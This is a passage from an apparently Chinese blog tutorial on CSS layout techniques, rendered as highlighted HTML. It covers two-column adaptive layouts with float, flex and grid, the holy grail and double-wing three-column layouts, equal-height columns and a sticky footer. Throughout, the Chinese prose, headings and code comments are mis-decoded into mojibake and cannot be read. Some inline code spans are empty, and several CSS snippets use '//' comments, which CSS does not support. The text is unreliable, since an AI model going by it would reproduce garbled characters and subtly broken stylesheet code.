src="https://i.loli.net/2021/06/30/hilAODCQjrPyXUK.jpg" alt="Snipaste_2021-06-30_21-30-12.jpg"></p><p>å¸¸è§çš„å•åˆ—å¸ƒå±€æœ‰ä¸¤ç§ï¼š</p><ul><li>header,contentå’Œfooterç­‰å®½çš„å•åˆ—å¸ƒå±€</li><li>headerä¸footerç­‰å®½,contentç•¥çª„çš„å•åˆ—å¸ƒå±€</li></ul><p><strong>å®ç°ï¼š</strong></p><ul><li>ç¬¬ä¸€ç§ï¼Œå…ˆé€šè¿‡å¯¹header,content,footerç»Ÿä¸€è®¾ç½®widthï¼š1000px;æˆ–è€…max-widthï¼š1000px(è¿™ä¸¤è€…çš„åŒºåˆ«æ˜¯å½“å±å¹•å°äº1000pxæ—¶ï¼Œå‰è€…ä¼šå‡ºç°æ»šåŠ¨æ¡ï¼Œåè€…åˆ™ä¸ä¼šï¼Œæ˜¾ç¤ºå‡ºå®é™…å®½åº¦);ç„¶åè®¾ç½®margin:autoå®ç°å±…ä¸­å³å¯å¾—åˆ°ã€‚</li><li>ç¬¬äºŒç§ï¼Œheaderã€footerçš„å†…å®¹å®½åº¦ä¸è®¾ç½®ï¼Œå—çº§å…ƒç´ å……æ»¡æ•´ä¸ªå±å¹•ï¼Œä½†headerã€contentå’Œfooterçš„å†…å®¹åŒºè®¾ç½®åŒä¸€ä¸ªwidthï¼Œå¹¶é€šè¿‡margin:autoå®ç°å±…ä¸­ã€‚</li></ul><h2 id="äºŒã€ä¸¤åˆ—è‡ªé€‚åº”å¸ƒå±€"><a href="#äºŒã€ä¸¤åˆ—è‡ªé€‚åº”å¸ƒå±€" class="headerlink" title="äºŒã€ä¸¤åˆ—è‡ªé€‚åº”å¸ƒå±€"></a>äºŒã€ä¸¤åˆ—è‡ªé€‚åº”å¸ƒå±€</h2><p>ä¸¤åˆ—è‡ªé€‚åº”å¸ƒå±€æ˜¯æŒ‡ä¸€åˆ—ç”±å†…å®¹æ’‘å¼€ï¼Œå¦ä¸€åˆ—æ’‘æ»¡å‰©ä½™å®½åº¦çš„å¸ƒå±€æ–¹å¼</p><h3 id="1-float-overflow-hidden"><a href="#1-float-overflow-hidden" class="headerlink" title="1.float+overflow:hidden"></a>1.float+overflow:hidden</h3><p>å¦‚æœæ˜¯æ™®é€šçš„ä¸¤åˆ—å¸ƒå±€ï¼Œ<strong>æµ®åŠ¨+æ™®é€šå…ƒç´ çš„margin</strong>ä¾¿å¯ä»¥å®ç°ï¼Œä½†å¦‚æœæ˜¯è‡ªé€‚åº”çš„ä¸¤åˆ—å¸ƒå±€ï¼Œåˆ©ç”¨<strong>float+overflow:hidden</strong>ä¾¿å¯ä»¥å®ç°ï¼Œè¿™ç§åŠæ³•ä¸»è¦é€šè¿‡overflowè§¦å‘BFC,è€ŒBFCä¸ä¼šé‡å æµ®åŠ¨å…ƒç´ ã€‚ç”±äºè®¾ç½®overflow:hiddenå¹¶ä¸ä¼šè§¦å‘IE6-æµè§ˆå™¨çš„haslayoutå±æ€§ï¼Œæ‰€ä»¥éœ€è¦è®¾ç½®zoom:1æ¥å…¼å®¹IE6-æµè§ˆå™¨ã€‚å…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;parent&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color: lightgrey;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;left&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color: lightblue;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>left<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;right&quot;</span>  <span class="attr">style</span>=<span class="string">&quot;background-color: lightgreen;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>right<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>right<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span>        </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.parent</span> &#123;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">  zoom: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.left</span> &#123;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">margin-right</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.right</span> &#123;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">  zoom: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-Flexå¸ƒå±€"><a href="#2-Flexå¸ƒå±€" class="headerlink" title="2.Flexå¸ƒå±€"></a>2.Flexå¸ƒå±€</h3><p>Flexå¸ƒå±€ï¼Œä¹Ÿå«å¼¹æ€§ç›’å­å¸ƒå±€ï¼ŒåŒºåŒºç®€å•å‡ è¡Œä»£ç å°±å¯ä»¥å®ç°å„ç§é¡µé¢çš„çš„å¸ƒå±€ã€‚</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.parent</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>:flex;</span><br><span class="line">&#125;  </span><br><span class="line"><span class="selector-class">.right</span> &#123;</span><br><span class="line">  <span class="attribute">margin-left</span>:<span class="number">20px</span>; </span><br><span class="line">  <span class="attribute">flex</span>:<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-gridå¸ƒå±€"><a href="#3-gridå¸ƒå±€" class="headerlink" title="3.gridå¸ƒå±€"></a>3.gridå¸ƒå±€</h3><p>Gridå¸ƒå±€ï¼Œæ˜¯ä¸€ä¸ªåŸºäºç½‘æ ¼çš„äºŒç»´å¸ƒå±€ç³»ç»Ÿï¼Œç›®çš„æ˜¯ç”¨æ¥ä¼˜åŒ–ç”¨æˆ·ç•Œé¢è®¾è®¡ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.parent &#123;</span><br><span class="line">  display:grid;</span><br><span class="line">  grid-template-columns:auto 1fr;</span><br><span class="line">  grid-gap:20px</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="ä¸‰ã€ä¸‰æ å¸ƒå±€"><a href="#ä¸‰ã€ä¸‰æ å¸ƒå±€" class="headerlink" title="ä¸‰ã€ä¸‰æ å¸ƒå±€"></a>ä¸‰ã€ä¸‰æ å¸ƒå±€</h2><p>ç‰¹å¾ï¼šä¸­é—´åˆ—è‡ªé€‚åº”å®½åº¦ï¼Œæ—è¾¹ä¸¤ä¾§å›ºå®šå®½åº¦</p><h3 id="1-åœ£æ¯å¸ƒå±€"><a href="#1-åœ£æ¯å¸ƒå±€" class="headerlink" title="1.åœ£æ¯å¸ƒå±€"></a>1.åœ£æ¯å¸ƒå±€</h3><p> <strong>â‘  ç‰¹ç‚¹ï¼š</strong>æ¯”è¾ƒç‰¹æ®Šçš„ä¸‰æ å¸ƒå±€ï¼ŒåŒæ ·ä¹Ÿæ˜¯ä¸¤è¾¹å›ºå®šå®½åº¦ï¼Œä¸­é—´è‡ªé€‚åº”ï¼Œå”¯ä¸€åŒºåˆ«æ˜¯domç»“æ„å¿…é¡»æ˜¯å…ˆå†™ä¸­é—´åˆ—éƒ¨åˆ†ï¼Œè¿™æ ·å®ç°ä¸­é—´åˆ—å¯ä»¥ä¼˜å…ˆåŠ è½½ã€‚</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">article</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>åœ£æ¯å¸ƒå±€<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;left&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;right&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">article</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">   <span class="attribute">padding-left</span>: <span class="number">220px</span>;//ä¸ºå·¦å³æ è…¾å‡ºç©ºé—´</span><br><span class="line">   <span class="attribute">padding-right</span>: <span class="number">220px</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="selector-class">.left</span> &#123;</span><br><span class="line">   <span class="attribute">float</span>: left;</span><br><span class="line">   <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">   <span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line">   <span class="attribute">background</span>: red;</span><br><span class="line">   <span class="attribute">margin-left</span>: -<span class="number">100%</span>;</span><br><span class="line">   <span class="attribute">position</span>: relative;</span><br><span class="line">   <span class="attribute">left</span>: -<span class="number">220px</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="selector-class">.center</span> &#123;</span><br><span class="line">   <span class="attribute">float</span>: left;</span><br><span class="line">   <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">   <span class="attribute">height</span>: <span class="number">500px</span>;</span><br><span class="line">   <span class="attribute">background</span>: yellow;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="selector-class">.right</span> &#123;</span><br><span class="line">   <span class="attribute">float</span>: left;</span><br><span class="line">   <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">   <span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line">   <span class="attribute">background</span>: blue;</span><br><span class="line">   <span class="attribute">margin-left</span>: -<span class="number">200px</span>;</span><br><span class="line">   <span class="attribute">position</span>: relative;</span><br><span class="line">   <span class="attribute">right</span>: -<span class="number">220px</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><strong>â‘¡ å®ç°æ­¥éª¤</strong></p><ul><li><p>ä¸‰ä¸ªéƒ¨åˆ†éƒ½è®¾å®šä¸ºå·¦æµ®åŠ¨ï¼Œ<strong>å¦åˆ™å·¦å³ä¸¤è¾¹å†…å®¹ä¸Šä¸å»ï¼Œå°±ä¸å¯èƒ½ä¸ä¸­é—´åˆ—åŒä¸€è¡Œ</strong>ã€‚ç„¶åè®¾ç½®centerçš„å®½åº¦ä¸º100%(<strong>å®ç°ä¸­é—´åˆ—å†…å®¹è‡ªé€‚åº”</strong>)ï¼Œæ­¤æ—¶ï¼Œleftå’Œrightéƒ¨åˆ†ä¼šè·³åˆ°ä¸‹ä¸€è¡Œ</p></li><li><p>é€šè¿‡è®¾ç½®margin-leftä¸ºè´Ÿå€¼è®©leftå’Œrightéƒ¨åˆ†å›åˆ°ä¸centeréƒ¨åˆ†åŒä¸€è¡Œ</p></li><li><p>é€šè¿‡è®¾ç½®çˆ¶å®¹å™¨çš„padding-leftå’Œpadding-rightï¼Œè®©å·¦å³ä¸¤è¾¹ç•™å‡ºé—´éš™ã€‚</p></li><li><p>é€šè¿‡è®¾ç½®ç›¸å¯¹å®šä½ï¼Œè®©leftå’Œrightéƒ¨åˆ†ç§»åŠ¨åˆ°ä¸¤è¾¹ã€‚</p></li></ul><p><strong>â‘¢ ç¼ºç‚¹</strong></p><ul><li>centeréƒ¨åˆ†çš„æœ€å°å®½åº¦ä¸èƒ½å°äºleftéƒ¨åˆ†çš„å®½åº¦ï¼Œå¦åˆ™ä¼šleftéƒ¨åˆ†æ‰åˆ°ä¸‹ä¸€è¡Œ</li><li>å¦‚æœå…¶ä¸­ä¸€åˆ—å†…å®¹é«˜åº¦æ‹‰é•¿(å¦‚ä¸‹å›¾)ï¼Œå…¶ä»–ä¸¤åˆ—çš„èƒŒæ™¯å¹¶ä¸ä¼šè‡ªåŠ¨å¡«å……ã€‚(å€ŸåŠ©ç­‰é«˜å¸ƒå±€æ­£padding+è´Ÿmarginå¯è§£å†³)</li></ul><h3 id="2-åŒé£ç¿¼å¸ƒå±€"><a href="#2-åŒé£ç¿¼å¸ƒå±€" class="headerlink" title="2.åŒé£ç¿¼å¸ƒå±€"></a>2.åŒé£ç¿¼å¸ƒå±€</h3><p><strong>â‘  ç‰¹ç‚¹ï¼š</strong>åŒæ ·ä¹Ÿæ˜¯ä¸‰æ å¸ƒå±€ï¼Œåœ¨åœ£æ¯å¸ƒå±€åŸºç¡€ä¸Šè¿›ä¸€æ­¥ä¼˜åŒ–ï¼Œè§£å†³äº†åœ£æ¯å¸ƒå±€é”™ä¹±é—®é¢˜ï¼Œå®ç°äº†å†…å®¹ä¸å¸ƒå±€çš„åˆ†ç¦»ã€‚è€Œä¸”ä»»ä½•ä¸€æ éƒ½å¯ä»¥æ˜¯æœ€é«˜æ ï¼Œä¸ä¼šå‡ºé—®é¢˜ã€‚</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">     <span class="attribute">min-width</span>: <span class="number">600px</span>;//ç¡®ä¿ä¸­é—´å†…å®¹å¯ä»¥æ˜¾ç¤ºå‡ºæ¥ï¼Œä¸¤å€<span class="attribute">left</span>å®½+<span class="attribute">right</span>å®½</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="selector-class">.left</span> &#123;</span><br><span class="line">     <span class="attribute">float</span>: left;</span><br><span class="line">     <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">     <span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line">     <span class="attribute">background</span>: red;</span><br><span class="line">     <span class="attribute">margin-left</span>: -<span class="number">100%</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="selector-class">.center</span> &#123;</span><br><span class="line">     <span class="attribute">float</span>: left;</span><br><span class="line">     <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">     <span class="attribute">height</span>: <span class="number">500px</span>;</span><br><span class="line">     <span class="attribute">background</span>: yellow;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="selector-class">.center</span> <span class="selector-class">.inner</span> &#123;</span><br><span class="line">     <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">200px</span>; //æ–°å¢éƒ¨åˆ†</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="selector-class">.right</span> &#123;</span><br><span class="line">     <span class="attribute">float</span>: left;</span><br><span class="line">     <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">     <span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line">     <span class="attribute">background</span>: blue;</span><br><span class="line">     <span class="attribute">margin-left</span>: -<span class="number">200px</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><strong>â‘¡ å®ç°æ­¥éª¤(å‰ä¸¤æ­¥ä¸åœ£æ¯å¸ƒå±€ä¸€æ ·)</strong></p><ul><li>ä¸‰ä¸ªéƒ¨åˆ†éƒ½è®¾å®šä¸ºå·¦æµ®åŠ¨ï¼Œç„¶åè®¾ç½®centerçš„å®½åº¦ä¸º100%ï¼Œæ­¤æ—¶ï¼Œleftå’Œrightéƒ¨åˆ†ä¼šè·³åˆ°ä¸‹ä¸€è¡Œï¼›</li><li>é€šè¿‡è®¾ç½®margin-leftä¸ºè´Ÿå€¼è®©leftå’Œrightéƒ¨åˆ†å›åˆ°ä¸centeréƒ¨åˆ†åŒä¸€è¡Œï¼›</li><li>centeréƒ¨åˆ†å¢åŠ ä¸€ä¸ªå†…å±‚divï¼Œå¹¶è®¾margin: 0 200pxï¼›</li></ul><p><strong>â‘¢ ç¼ºç‚¹</strong></p><p>å¤šåŠ ä¸€å±‚ dom æ ‘èŠ‚ç‚¹ï¼Œå¢åŠ æ¸²æŸ“æ ‘ç”Ÿæˆçš„è®¡ç®—é‡ã€‚</p><h3 id="3-ä¸¤ç§å¸ƒå±€å®ç°æ–¹å¼å¯¹æ¯”"><a href="#3-ä¸¤ç§å¸ƒå±€å®ç°æ–¹å¼å¯¹æ¯”" class="headerlink" title="3.ä¸¤ç§å¸ƒå±€å®ç°æ–¹å¼å¯¹æ¯”:"></a>3.ä¸¤ç§å¸ƒå±€å®ç°æ–¹å¼å¯¹æ¯”:</h3><ul><li>ä¸¤ç§å¸ƒå±€æ–¹å¼éƒ½æ˜¯æŠŠä¸»åˆ—æ”¾åœ¨æ–‡æ¡£æµæœ€å‰é¢ï¼Œä½¿ä¸»åˆ—ä¼˜å…ˆåŠ è½½ã€‚</li><li>ä¸¤ç§å¸ƒå±€æ–¹å¼åœ¨å®ç°ä¸Šä¹Ÿæœ‰ç›¸åŒä¹‹å¤„ï¼Œéƒ½æ˜¯è®©ä¸‰åˆ—æµ®åŠ¨ï¼Œç„¶åé€šè¿‡è´Ÿå¤–è¾¹è·å½¢æˆä¸‰åˆ—å¸ƒå±€ã€‚</li><li>ä¸¤ç§å¸ƒå±€æ–¹å¼çš„ä¸åŒä¹‹å¤„åœ¨äºå¦‚ä½•å¤„ç†ä¸­é—´ä¸»åˆ—çš„ä½ç½®ï¼š <strong>åœ£æ¯å¸ƒå±€æ˜¯åˆ©ç”¨çˆ¶å®¹å™¨çš„å·¦ã€å³å†…è¾¹è·+ä¸¤ä¸ªä»åˆ—ç›¸å¯¹å®šä½</strong>ï¼› <strong>åŒé£ç¿¼å¸ƒå±€æ˜¯æŠŠä¸»åˆ—åµŒå¥—åœ¨ä¸€ä¸ªæ–°çš„çˆ¶çº§å—ä¸­åˆ©ç”¨ä¸»åˆ—çš„å·¦ã€å³å¤–è¾¹è·è¿›è¡Œå¸ƒå±€è°ƒæ•´</strong></li></ul><h2 id="å››ã€ç­‰é«˜å¸ƒå±€"><a href="#å››ã€ç­‰é«˜å¸ƒå±€" class="headerlink" title="å››ã€ç­‰é«˜å¸ƒå±€"></a>å››ã€ç­‰é«˜å¸ƒå±€</h2><p>ç­‰é«˜å¸ƒå±€æ˜¯æŒ‡å­å…ƒç´ åœ¨çˆ¶å…ƒç´ ä¸­é«˜åº¦ç›¸ç­‰çš„å¸ƒå±€æ–¹å¼ã€‚å¸¸è§å‡ ç§å®ç°æ–¹å¼ï¼š</p><h3 id="1-åˆ©ç”¨æ­£padding-è´Ÿmargin"><a href="#1-åˆ©ç”¨æ­£padding-è´Ÿmargin" class="headerlink" title="1.åˆ©ç”¨æ­£padding+è´Ÿmargin"></a>1.åˆ©ç”¨æ­£padding+è´Ÿmargin</h3><p>é€šè¿‡ç­‰å¸ƒå±€ä¾¿å¯è§£å†³åœ£æ¯å¸ƒå±€çš„ç¬¬äºŒä¸ªç¼ºç‚¹ï¼Œå› ä¸ºèƒŒæ™¯æ˜¯åœ¨ padding åŒºåŸŸæ˜¾ç¤ºçš„ï¼Œ<strong>è®¾ç½®ä¸€ä¸ªå¤§æ•°å€¼çš„ padding-bottomï¼Œå†è®¾ç½®ç›¸åŒæ•°å€¼çš„è´Ÿçš„ margin-bottomï¼Œå¹¶åœ¨æ‰€æœ‰åˆ—å¤–é¢åŠ ä¸Šä¸€ä¸ªå®¹å™¨ï¼Œå¹¶è®¾ç½® overflow:hidden æŠŠæº¢å‡ºèƒŒæ™¯åˆ‡æ‰</strong>ã€‚è¿™ç§å¯èƒ½å®ç°å¤šåˆ—ç­‰é«˜å¸ƒå±€ï¼Œå¹¶ä¸”ä¹Ÿèƒ½å®ç°åˆ—ä¸åˆ—ä¹‹é—´åˆ†éš”çº¿æ•ˆæœï¼Œç»“æ„ç®€å•ï¼Œå…¼å®¹æ‰€æœ‰æµè§ˆå™¨ã€‚æ–°å¢ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.center</span>,</span><br><span class="line">   <span class="selector-class">.left</span>,</span><br><span class="line">   <span class="selector-class">.right</span> &#123;</span><br><span class="line">     <span class="attribute">padding-bottom</span>: <span class="number">10000px</span>;</span><br><span class="line">     <span class="attribute">margin-bottom</span>: -<span class="number">10000px</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="selector-class">.container</span> &#123;</span><br><span class="line">     <span class="attribute">padding-left</span>: <span class="number">220px</span>;</span><br><span class="line">     <span class="attribute">padding-right</span>: <span class="number">220px</span>;</span><br><span class="line">     <span class="attribute">overflow</span>: hidden;//æŠŠæº¢å‡ºèƒŒæ™¯åˆ‡æ‰</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="2-åˆ©ç”¨èƒŒæ™¯å›¾ç‰‡"><a href="#2-åˆ©ç”¨èƒŒæ™¯å›¾ç‰‡" class="headerlink" title="2.åˆ©ç”¨èƒŒæ™¯å›¾ç‰‡"></a>2.åˆ©ç”¨èƒŒæ™¯å›¾ç‰‡</h3><p>è¿™ç§æ–¹æ³•æ˜¯æˆ‘ä»¬å®ç°ç­‰é«˜åˆ—æœ€æ—©ä½¿ç”¨çš„ä¸€ç§æ–¹æ³•ï¼Œå°±æ˜¯ä½¿ç”¨èƒŒæ™¯å›¾ç‰‡ï¼Œåœ¨åˆ—çš„çˆ¶å…ƒç´ ä¸Šä½¿ç”¨è¿™ä¸ªèƒŒæ™¯å›¾è¿›è¡ŒYè½´çš„é“ºæ”¾ï¼Œä»è€Œå®ç°ä¸€ç§ç­‰é«˜åˆ—çš„å‡è±¡ã€‚å®ç°æ–¹æ³•ç®€å•ï¼Œå…¼å®¹æ€§å¼ºï¼Œä¸éœ€è¦å¤ªå¤šçš„cssæ ·å¼å°±å¯ä»¥è½»æ¾å®ç°,ä½†æ­¤æ–¹æ³•ä¸é€‚åˆæµä½“å¸ƒå±€ç­‰é«˜åˆ—çš„å¸ƒå±€ã€‚</p><h3 id="3-æ¨¡ä»¿è¡¨æ ¼å¸ƒå±€"><a href="#3-æ¨¡ä»¿è¡¨æ ¼å¸ƒå±€" class="headerlink" title="3.æ¨¡ä»¿è¡¨æ ¼å¸ƒå±€"></a>3.æ¨¡ä»¿è¡¨æ ¼å¸ƒå±€</h3><p>è¿™æ˜¯ä¸€ç§éå¸¸ç®€å•ï¼Œæ˜“äºå®ç°çš„æ–¹æ³•ã€‚ä¸è¿‡å…¼å®¹æ€§ä¸å¥½ï¼Œåœ¨ie6-7æ— æ³•æ­£å¸¸è¿è¡Œã€‚</p><h3 id="4-ä½¿ç”¨è¾¹æ¡†å’Œå®šä½"><a href="#4-ä½¿ç”¨è¾¹æ¡†å’Œå®šä½" class="headerlink" title="4.ä½¿ç”¨è¾¹æ¡†å’Œå®šä½"></a>4.ä½¿ç”¨è¾¹æ¡†å’Œå®šä½</h3><p>è¿™ç§æ–¹æ³•æ˜¯ä½¿ç”¨è¾¹æ¡†å’Œç»å¯¹å®šä½æ¥å®ç°ä¸€ä¸ªå‡çš„é«˜åº¦ç›¸ç­‰åˆ—çš„æ•ˆæœã€‚ç»“æ„ç®€å•ï¼Œå…¼å®¹å„æµè§ˆå™¨ï¼Œå®¹æ˜“æŒæ¡ã€‚å‡è®¾ä½ éœ€è¦å®ç°ä¸€ä¸ªä¸¤åˆ—ç­‰é«˜å¸ƒå±€ï¼Œä¾§æ é«˜åº¦è¦å’Œä¸»å†…å®¹é«˜åº¦ç›¸ç­‰ã€‚</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#wrapper</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">960px</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#mainContent</span> &#123;</span><br><span class="line">  <span class="attribute">border-right</span>: <span class="number">220px</span> solid <span class="number">#dfdfdf</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">740px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">800px</span>;  </span><br><span class="line">  <span class="attribute">background</span>: green;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#sidebar</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#dfdfdf</span>;</span><br><span class="line">  <span class="attribute">margin-left</span>: <span class="number">740px</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">800px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">220px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="äº”ã€ç²˜è¿å¸ƒå±€"><a href="#äº”ã€ç²˜è¿å¸ƒå±€" class="headerlink" title="äº”ã€ç²˜è¿å¸ƒå±€"></a>äº”ã€ç²˜è¿å¸ƒå±€</h2><h3 id="1-ç‰¹ç‚¹"><a href="#1-ç‰¹ç‚¹" class="headerlink" title="1.ç‰¹ç‚¹"></a>1.ç‰¹ç‚¹</h3><ul><li>æœ‰ä¸€å—å†…å®¹<code>ï¼Œå½“</code>çš„é«˜åº·è¶³å¤Ÿé•¿çš„æ—¶å€™ï¼Œç´§è·Ÿåœ¨<code>åé¢çš„å…ƒç´ </code>ä¼šè·Ÿåœ¨``å…ƒç´ çš„åé¢ã€‚</li><li>å½“<code>å…ƒç´ æ¯”è¾ƒçŸ­çš„æ—¶å€™(æ¯”å¦‚å°äºå±å¹•çš„é«˜åº¦),æˆ‘ä»¬æœŸæœ›è¿™ä¸ª</code>å…ƒç´ èƒ½å¤Ÿâ€œç²˜è¿â€åœ¨å±å¹•çš„åº•éƒ¨</li></ul><p><img src="https://i.loli.net/2021/06/30/q52LdVIhQDH67pw.jpg" alt="Snipaste_2021-06-30_21-50-14.jpg"></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;wrap&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;main&quot;</span>&gt;</span></span><br><span class="line">       main <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">       main <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">       main <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;footer&quot;</span>&gt;</span>footer<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">* &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">html</span>,</span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;//é«˜åº¦ä¸€å±‚å±‚ç»§æ‰¿ä¸‹æ¥</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#wrap</span> &#123;</span><br><span class="line">  <span class="attribute">min-height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">background</span>: pink;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#wrap</span> <span class="selector-class">.main</span> &#123;</span><br><span class="line">  <span class="attribute">padding-bottom</span>: <span class="number">50px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#footer</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">50px</span>;</span><br><span class="line">  <span class="attribute">background</span>: deeppink;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">margin-top</span>: -<span class="number">50px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-å®ç°æ­¥éª¤"><a href="#2-å®ç°æ­¥éª¤" class="headerlink" 